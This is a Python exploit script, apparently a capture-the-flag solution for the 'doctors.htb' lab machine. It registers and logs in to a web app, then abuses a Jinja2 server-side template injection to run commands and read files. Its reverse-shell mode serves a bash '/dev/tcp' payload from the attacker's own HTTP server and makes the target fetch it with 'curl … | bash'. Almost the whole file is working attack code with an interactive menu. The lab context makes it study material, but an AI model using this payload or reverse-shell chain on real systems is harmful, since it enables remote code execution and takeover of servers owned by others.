#!/usr/bin/env python3
import requests, random, re, socket, http.server
from fcntl import ioctl
from struct import pack
from base64 import b64encode
from multiprocessing import Process

url="http://doctors.htb"

proxies = {"http":"localhost:8080"}
username = f"chronos{str(random.randrange(00,99))}"


# Register using supplied credentials
def register(username:str="chronos", password:str="P@ssw0rd") -> bool:
    """
    Registers an account using the specified credentials and returns true if registration was successful
    """
    email = f"{username}@doctors.htb"
    data = {"username":username, "email":email, "password":password, "confirm_password":password, "submit":"submit"}
    r = requests.post(url=f"{url}/register", data=data, proxies=proxies, allow_redirects=False)
    if r.status_code == 302:
        print(f"[+] Successfully registered in as {email}:{password}")
        return True
    else:
        #print(f"[-] Could not register an account with {email}:{password}!")
        return False


# Login using supplied credentials
def login(username:str="chronos", password:str="P@ssw0rd") -> requests.Session:
    """
    Logins using the specified credentials and returns a session
    """
    email = f"{username}@doctors.htb"
    data = {"email":email, "password":password, "submit":"Login"}
    session = requests.Session()
    r = session.post(url=f"{url}/login",data=data,proxies=proxies)
    if r.status_code == 200:
        #print(f"[+] Successfully logged in with {email}:{password}")
        return session
    else:
        raise Exception(f"[-] Could not login with {email}:{password}!")


# Send message to server
def send_message(msg:str="test", session:requests.Session=None) -> bool:
    """
    Sends the specified msg and returns true if successful
    """
    if not session:
        session = login(username)
    
    data = {"title":msg, "content":msg}
    r = session.post(url=f"{url}/post/new", data=data, proxies=proxies)
    if "post has been created!" in r.text:
        #print(f"[*] Post {msg} created!")
        return True
    else:
        if r.status_code == 500:
            raise Exception("[-] Error (Status 500) occurred on server!")
        else:
            raise Exception("[-] Message was not created!")


# Find string between two other strings
def find_between(s:str, first:str, last:str) -> str:
    """
    Find string s between first and last
    """
    try:
        start = s.index( first ) + len( first )
        end = s.index( last, start )
        return s[start:end]
    except ValueError:
        return ""


# Gets response from server and parses it
def get_response(session:requests.Session=None, raw:bool=False) -> str:
    """
    Pulls response from /archive and parse the most recent response
    """
    try:
        if not session:
            session = login(username)
        
        r = session.get(url=f"{url}/archive", proxies=proxies, timeout=1)
        if raw:
            return r.text
        output = [output.strip() for output in r.text.split("<title>Archive</title>")[1].split("</channel>")]
        output.remove("")
        parsed = [find_between(x,"OUTPUTSTART","OUTPUTEND").strip() for x in output][-1]
        if parsed:
            return parsed
        else:
            return output
    except Exception as ex:
        return f"No output! Because of error: {ex}"


# Send SSTI payload
def inject(payload:str) -> str:
    """
    Sends payload and get returns response
    """
    send_message(payload)
    return get_response()


# Reads file from server
def file_read(file:str) -> str:
    """
    Tries to read the specified file and returns it's content
    """
    return rce(f"cat {file}")


# Execute commands on server
def rce(cmd:str) -> str:
    """
    Code-excution using the SSTI and returns the response
    """
    payload = f"OUTPUTSTART{{{{config.__class__.__init__.__globals__['os'].popen('{cmd}').read()}}}}OUTPUTEND"
    return inject(payload)


# Clears screen
def clear() -> None:
    """
    Clears screen
    """
    print(chr(27) + "[H" + chr(27) + "[J")


# Returns IP of the specified interface
def get_ip(ifname:str="tun0") -> str:
    """
    Returns IP of specified  ifname
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(ioctl(s.fileno(), 0x8915,
            pack('256s', ifname[:15].encode()))[20:24])


# Gets a reverse-shell by serving a payload via http
def get_shell(port:int=443) -> None:
    """
    Exploits the SSTI to get a reverse-shell
    """
    # Setup http server                                                                                               
    http = Process(target=setup_http)                                                                                 
    http.daemon = True                                                                                                
    http.start()

    # Send reverse-shell payload
    rce(f"curl {get_ip()} | bash")


# Setup http-server                                                                                                   
def setup_http() -> None:  
    """
    Setup an http-server to listen on port 80
    """                                                                                                   
    try:
        handler = HttpRequestHandler
        with http.server.HTTPServer(("",80), handler) as httpd:
            httpd.serve_forever()                                                       
    except KeyboardInterrupt:                                                                                     
        pass                                                                                         
    except Exception as ex:
        raise Exception(f"Could not setup http-server because of an error: {ex}")


# Create reverse-shell payload
def gen_rev() -> str:
    """
    Generate bash-reverse-shell payload
    """
    return "#!/bin/bash\n" + f"bash -c 'bash -i >& /dev/tcp/{get_ip()}/{443} 0>&1'"


# HTTP Handler to server payload files                     
class HttpRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        print(f"[*] Served reverse-shell payload via http to {self.client_address[0]}!")
        self.send_response(200)                                                                                   
        self.send_header("Content-type", "text/x-sh")                                                             
        self.end_headers()                                                                                        
        file = gen_rev()                                                                                          
        self.wfile.write(bytes(file, "utf8"))
        quit()
    # Override log_request to silent messages
    def log_request(self, format, *args):
        return


if __name__ == "__main__":
    try:
        register(username)
        session = login(username)

        while not session:
            username = f"chronos{str(random.randrange(00,99))}"
            register(username)
            session = login(username)

        while True:
            print("""\r\nPossible inputs:
    *Message*   ... Send input raw
    'shell'     ... Get reverse-shell on port 443
    'rce'       ... Remote-Code-Execution
    'file-read' ... File-read
    'view'      ... View /archive in raw form
    'quit'      ... Exit program""")

            payload = input("> ")
            if "quit" in payload:
                clear()
                quit()
            elif "shell" in payload:
                ok = input("Listen on port 443! [Y/n] ")
                clear()
                if not any(s in ok.lower() for s in ["n","no"]):
                    get_shell()
            elif "view" in payload:
                clear()
                print(get_response(raw=True))
            elif "file-read" in payload:
                file = ""
                while "exit" not in file:
                    file = input("file> ")
                    print(file_read(file))
            elif "rce" in payload:
                cmd = ""
                while "exit" not in cmd:
                    cmd = input("cmd> ").s
                    print(rce(cmd))
                clear()
            else:
                clear()
                if payload != "":
                    print(inject(payload))
    except KeyboardInterrupt as ex:
        pass
    except Exception as ex:
        print(ex)
        
